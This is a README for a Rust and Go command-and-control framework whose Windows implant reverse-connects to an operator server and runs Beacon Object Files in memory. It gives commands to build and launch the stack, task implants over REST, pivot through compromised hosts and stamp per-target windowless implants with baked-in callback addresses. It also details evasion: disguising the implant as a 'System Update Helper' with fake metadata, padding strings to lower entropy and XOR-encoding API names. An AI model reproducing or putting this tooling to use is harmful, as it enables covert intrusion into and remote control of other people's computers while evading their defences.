# RustStrike

A BOF (Beacon Object File) C2 framework: an in-process COFF loader, a Windows
implant, an operator service core, and a desktop console. The implant receives a
base64-encoded COFF object, loads it **in-process** (no `LoadLibrary`/separate
loader), resolves its relocations and external symbols, and executes its `go`
entry point. x64 Windows only for execution; the COFF parser is cross-platform
and unit-testable anywhere.

> For the full engineering contract (wire format invariants, loader internals,
> OPSEC layers, conventions), see [`CLAUDE.md`](./CLAUDE.md). For the BOF
> library, see [`examples/README.md`](./examples/README.md).

## Architecture

Four Rust crates in one workspace, plus a Go service core and a Wails desktop
GUI. Dependency direction: `protocol` ← `server`; `protocol` + `loader` ←
`implant`.

| Crate | Role |
|---|---|
| **`protocol`** | `ServerMessage` / `ImplantMessage` enums, newline-JSON wire format, base64 helpers. The single source of truth for the wire contract. |
| **`loader`** | The in-process COFF loader. `coff.rs` (pure, cross-platform parser) + `exec.rs`/`beacon.rs` (Windows-only: `VirtualAlloc` RWX image, relocations, externals, Beacon API stubs). |
| **`server`** | Reference Rust TCP listener + stdin console (single-implant smoke). |
| **`implant`** | Windows reverse-connect binary. A shared lib backs two bins: `ruststrike-implant` (console) and `ruststrike-implant-silent` (GUI subsystem, no window). |

**Go service core** (`clients/server/`) — the operator-facing service. TCP
listener for the implant transport + HTTP/WS for the GUI. Multi-implant sessions,
BOF library, SQLite persistence (logs/listeners/agents/artifacts), runtime
listener management, stub builder, relay/pivot, task-poll bridge.

**Wails GUI** (`clients/client/`) — a Vue 3 + TS desktop console (branded
**XStrike**). In desktop mode it drives the real implant via the Go core; a
mock/demo mode is available for browser preview.

## Build & test

Everything builds natively on Windows. A `rust-toolchain.toml` pins **stable
MSVC** (required — see `CLAUDE.md` for why).

```sh
cargo build --release             # whole workspace
cargo test --release              # protocol + coff + beacon + server + in-process BOF exec
cargo clippy --workspace --all-targets
```

The example BOFs are C files compiled to COFF objects with the MinGW gcc
toolchain (e.g. MSYS2):

```sh
gcc -c examples/hello.c -o examples/hello.x64.o        # or: x86_64-w64-mingw32-gcc
cp examples/*.x64.o clients/server/bofs/               # stage into the BOF library
```

Go core + Wails GUI:

```sh
cd clients/server   && go build -o server.exe .
cd clients/client   && wails build        # → build/bin/xstrike.exe
cd clients/client/frontend && npm run typecheck && npm run build
```

## Run the stack

`run-all.ps1` builds anything missing and launches the core + an implant + the
GUI, each in its own window:

```powershell
.\run-all.ps1                # core + implant + GUI
.\run-all.ps1 -NoGui         # core + implant only (drive via REST)
.\run-all.ps1 -NoImplant     # core + GUI only (connect an implant manually)
```

Or manually:

```sh
# 1. Go service core (implant TCP :4444, operator HTTP/WS :8091)
RUSTSTRIKE_BOFS=./clients/server/bofs ./clients/server/server.exe 4444 8091
# 2. Rust implant (reverse-connects to the core)
./target/release/ruststrike-implant.exe 127.0.0.1 4444
# 3. GUI (desktop console over the core's API)
cd clients/client && wails dev   # or: build/bin/xstrike.exe
```

Drive via REST (returns a `task_id`; poll `/api/tasks/{id}` for output):

```sh
curl -s http://127.0.0.1:8091/api/implants
curl -X POST "http://127.0.0.1:8091/api/bofs/ps/run?implant=1" -H 'Content-Type: application/json' -d '{"args":""}'
```

## Wire contract

Newline-delimited JSON over a single TCP stream. Discriminator is `type`,
`snake_case`. `crates/protocol/src/lib.rs` is the source of truth.

- **server → implant:** `hello`, `bof` (`{file, args}` — both base64; `args` is
  the binary CS packed arg buffer, **required** even if empty), `relay_listen`
  (`{relay_id, bind_ip, port}`), `relay_stop` (`{relay_id}`).
- **implant → server:** `hello`/`output`/`error` (`{data}`), `relay_started`
  (`{relay_id, bind_ip, port}`), `relay_stopped` (`{relay_id}`), `relay_error`
  (`{relay_id, data}`).

Each message is one line terminated by `\n`. Implant output can be large — use a
generous line buffer (the core uses 16 MB).

## BOF compatibility

The loader runs Cobalt-Strike-4.x / AdaptixC2-style BOFs. Verified end-to-end
with an AdaptixC2 [Extension-Kit](https://github.com/Adaptix-Framework/Extension-Kit)
BOF (`SAR-BOF/nbtscan`). Build third-party BOFs with mingw
(`x86_64-w64-mingw32-gcc`); externals are `__imp_LIBRARY$function` imports +
`__imp_Beacon*`, resolved via `LoadLibrary`/`GetProcAddress` and the Beacon
stubs. Only the data/output Beacon APIs and basic CRT are stubbed; unimplemented
`Beacon*` calls fall back to a no-op note. See `CLAUDE.md` "BOF compatibility".

## Pivot / relay (chain implants through each other)

A connected implant can act as a **relay server** so a second implant (on a
network that can reach the parent but not the core) dials the parent and appears
online at the core — a CS-style TCP pivot. The parent opens a TCP listener and
**splices** each child's stream onto a fresh connection to the core; the child's
bytes are transparent newline-JSON, so the core registers it as a normal new
implant (no protocol demux).

```sh
# 1. Parent implant (id 1) is connected. Start a relay (port 0 = OS-assigned):
curl -X POST "http://127.0.0.1:8091/api/implants/1/relay" \
  -H 'Content-Type: application/json' -d '{"bind_ip":"0.0.0.0","port":0}'
# -> {"relay_id":"rl-xx","status":"requested"}  (actual port arrives async)
curl -s "http://127.0.0.1:8091/api/implants/1/relays"   # -> [{id, bind_ip, port, state}]

# 2. Generate a child agent pointing its callback at the parent's reachable IP
#    + the relay port (GUI: Generate Agent → enter parent IP + relay port).
# 3. Run the child — it connects to the parent, which splices it to the core.
#    The child shows up in GET /api/implants as a new session.

# 4. Stop the relay:
curl -X DELETE "http://127.0.0.1:8091/api/implants/1/relays/rl-xx"
```

In the GUI: open an agent → **Pivot** tab → Start Relay, copy the connect string,
then Generate Agent with that host:port. Relay state is transient (lives in the
parent process; not persisted) and is dropped when the parent disconnects.

**OPSEC note:** a TCP listener on the parent is a detection surface. A stealthier
named-pipe variant (`\\.\pipe\xxx`) is planned but not yet built.

## OPSEC / stealth (release implant)

The release implant is scrubbed to look like an ordinary "System Update Helper"
application rather than a BOF C2 agent (all in the default release build):

- PE metadata (VERSIONINFO + manifest) → "System Update Helper", version
  10.0.22621.0, `asInvoker`, common-controls v6. PDB reads `updatehelper.pdb`.
- Debug logs compile out unless the `verbose` feature is on.
- Benign string padding (a fake EULA) dilutes suspicious strings / keeps entropy
  low (~6.4 bits/byte — normal PE range).
- XOR-encoded Beacon API symbol names (never appear in `.rdata`).
- Build-path remapping scrubs workspace/user paths out of panic Locations;
  source files are neutrally named (`stubs.rs`/`obj.rs`/`exec.rs`).
- Two implant variants: **console** (dev) and **silent** (GUI subsystem, no
  window on launch) — the stub builder's `silent` flag selects the base exe.
  Command-exec BOFs already spawn children with `CREATE_NO_WINDOW`, so a silent
  agent runs entirely in the background.

## Implant stub builder

The implant reads its callback host:port from an **appended-config trailer** on
its own exe (else falls back to CLI args). This lets you deploy one patched
binary per target with a baked-in callback — no args on the target.

```sh
# CLI
cd tools/stubbuilder && go build -o stubbuilder.exe .
./stubbuilder.exe ../../target/release/ruststrike-implant.exe out.exe 10.0.0.5 4444
# windowless agent: patch the silent base instead
./stubbuilder.exe ../../target/release/ruststrike-implant-silent.exe out.exe 10.0.0.5 4444

# or via the Go core (used by the GUI's Generate Agent button)
curl -X POST "http://127.0.0.1:8091/api/stub/build" \
  -H 'Content-Type: application/json' -d '{"host":"10.0.0.5","port":"4444","silent":true}'
# -> {"exe_b64":"..."}
```

Re-patching an already-patched exe strips the old trailer first (no
accumulation).

## Limitations

- x64 only; x86 COFFs are rejected at parse time.
- Only the data/output Beacon APIs and basic CRT are stubbed.
- `BeaconPrintf` captures only the first two variadic args.
- BOF image memory is intentionally not freed after execution.
- Relay/pivot is TCP-only (named-pipe variant + SOCKS proxy are planned).
- Download/screenshot output is capped so the base64 fits the core's line buffer.

See `CLAUDE.md` "v1 limitations" for the complete list.

## License

See the workspace `Cargo.toml`.
